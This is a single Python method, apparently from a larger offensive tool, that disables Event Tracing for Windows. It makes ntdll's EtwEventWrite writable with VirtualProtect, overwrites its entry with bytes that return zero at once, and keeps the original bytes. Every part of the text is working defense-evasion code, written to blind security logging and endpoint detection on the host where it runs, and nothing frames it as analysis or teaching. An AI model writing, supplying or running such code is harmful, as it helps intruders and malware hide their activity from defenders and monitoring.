    def patch_etw_logging(self):
        """Disable ETW logging - safe and stable version"""
        
        try:
            import ctypes
            import ctypes.wintypes
            import sys
            
            if sys.platform != 'win32':
                self.debug_log('ETW patch: Only Windows supported')
                return False
            
            is_64bit = sys.maxsize > 2**32
            
            try:
                ntdll = ctypes.windll.ntdll
                kernel32 = ctypes.windll.kernel32
                
                try:
                    etw_event_write = getattr(ntdll, 'EtwEventWrite', None)
                    if not etw_event_write:
                        self.debug_log('ETW patch: EtwEventWrite function not found')
                        return False
                except Exception as e:
                    self.debug_log(f'ETW patch: Function access error: {e}')
                    return False
                
                try:
                    if is_64bit:
                        etw_address = ctypes.cast(etw_event_write, ctypes.c_void_p).value
                        if etw_address > 0xFFFFFFFFFFFFFFFF or etw_address < 0x1000:
                            self.debug_log('ETW patch: Invalid 64-bit address')
                            return False
                    else:
                        etw_address = ctypes.cast(etw_event_write, ctypes.c_void_p).value
                        if etw_address > 0xFFFFFFFF or etw_address < 0x1000:
                            self.debug_log('ETW patch: Invalid 32-bit address')
                            return False
                except Exception as e:
                    self.debug_log(f'ETW patch: Address calculation error: {e}')
                    return False
                
                if is_64bit:
                    patch_bytes = b'\x48\x31\xC0\xC3'
                else:
                    patch_bytes = b'\x31\xC0\xC3'
                
                old_protect = ctypes.wintypes.DWORD()
                try:
                    result = kernel32.VirtualProtect(
                        ctypes.c_void_p(etw_address),
                        len(patch_bytes),
                        0x40,
                        ctypes.byref(old_protect)
                    )
                    
                    if not result:
                        error_code = kernel32.GetLastError()
                        self.debug_log(f'ETW patch: VirtualProtect failed (Error: {error_code})')
                        return False
                        
                except Exception as e:
                    self.debug_log(f'ETW patch: VirtualProtect error: {e}')
                    return False
                
                original_bytes = ctypes.create_string_buffer(len(patch_bytes))
                try:
                    ctypes.memmove(original_bytes, etw_address, len(patch_bytes))
                except Exception as e:
                    self.debug_log(f'ETW patch: Original code backup failed: {e}')
                    kernel32.VirtualProtect(
                        ctypes.c_void_p(etw_address),
                        len(patch_bytes),
                        old_protect.value,
                        ctypes.byref(old_protect)
                    )
                    return False
                
                try:
                    ctypes.memmove(etw_address, patch_bytes, len(patch_bytes))
                except Exception as e:
                    self.debug_log(f'ETW patch: Patch application failed: {e}')
                    ctypes.memmove(etw_address, original_bytes, len(patch_bytes))
                    kernel32.VirtualProtect(
                        ctypes.c_void_p(etw_address),
                        len(patch_bytes),
                        old_protect.value,
                        ctypes.byref(old_protect)
                    )
                    return False
                
                try:
                    result = kernel32.VirtualProtect(
                        ctypes.c_void_p(etw_address),
                        len(patch_bytes),
                        old_protect.value,
                        ctypes.byref(old_protect)
                    )
                    
                    if not result:
                        self.debug_log('ETW patch: Memory protection restore failed')
                        ctypes.memmove(etw_address, original_bytes, len(patch_bytes))
                        return False
                        
                except Exception as e:
                    self.debug_log(f'ETW patch: Memory protection restore error: {e}')
                    ctypes.memmove(etw_address, original_bytes, len(patch_bytes))
                    return False
                
                self.debug_log(f'ETW logging safely disabled ({len(patch_bytes)} bytes)')
                
                self._etw_original_bytes = original_bytes
                self._etw_patch_address = etw_address
                self._etw_patch_size = len(patch_bytes)
                
                return True
                
            except Exception as e:
                self.debug_log(f'ETW patch: General error: {e}')
                return False
                
        except Exception as e:
            self.debug_log(f'ETW patch: Critical error: {e}')
            return False

